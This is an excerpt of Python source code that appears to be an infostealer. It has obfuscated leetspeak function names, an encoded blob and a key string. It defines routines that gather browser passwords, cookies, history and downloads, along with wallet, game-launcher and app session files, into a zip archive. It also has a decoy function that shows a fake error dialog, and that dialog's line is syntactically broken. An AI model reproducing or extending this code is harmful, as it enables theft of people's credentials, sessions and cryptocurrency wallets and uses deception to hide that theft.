...
HdYon19DaeutfD/m4E53zAtU7DsQdhNaz9LCFiQgVMSWYk5G6IGw5cWKOmCX70GWbIjNOojMWMn/JqPj+O5VkJj98/iKtH8D1sfoUgIApYVFnsCJ+PXb0xeVWC4M9TvhV3bGEG9+mROycsPvOS8c8vlkX7CnQZwZQyZb/lETn5IkPB5eVBptre0IC5r8WB1aW5cbG2bbBAwLjSOE+GN7NQ==
"""

v4r_k3y            = "DicJejcJfbtpjFTzxUtoshLJSRrqihllgUoszVDsvJHHynDEJTfNgdIbKAUJWXvEpbMjEwfGntwCIFxrJtbrZPnFEjzRDsMtSTOLappWBkEoeJAyEaKIRMUywoFaVPGAkkZXlurPDWQvFp"
v4r_website        = "None"
...
def D3f_S3ssi0nFil3s(v4r_zip_file):
    ...
    v4r_session_files_choice = ["Wallets", "Game Launchers", "Apps"]
...
def D3f_Br0w53r5t341(v4r_zip_file):
    ...
    v4r_browser_choice = ["extentions", "passwords", "cookies", "history", "downloads"]
    v4r_browsers = []
...
def D3f_F4k33rr0r():
    ...
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("voles abi", "voles abi print" (hello firnd)")
